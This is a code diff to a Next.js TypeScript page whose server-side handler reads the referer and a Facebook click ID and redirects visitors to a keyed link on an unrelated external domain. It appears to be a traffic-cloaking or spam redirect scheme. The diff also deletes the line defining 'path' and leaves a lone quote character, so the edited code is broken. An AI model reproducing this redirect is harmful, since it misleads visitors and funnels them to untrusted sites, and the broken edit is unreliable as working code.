@@ -1,3 +1,4 @@
+
 import React from 'react';
 import Head from 'next/head';
 import { GetServerSideProps } from 'next';
@@ -8,7 +9,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
-	const path = pathArr.join('/');
+'
 	console.log(path);
 	const fbclid = ctx.query.fbclid;
 
@@ -19,7 +20,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://latelyninetyfeelings.com/aih11mari?key=aec6c91151fcbc016b0ecee588f48701` + encodeURI(path as string)
+					`https://latelyninetyfeelings.com/aih11mari?key=aec6c91151fcbc016b0ecee588f48701` 
 				}`,
 			},
 		};
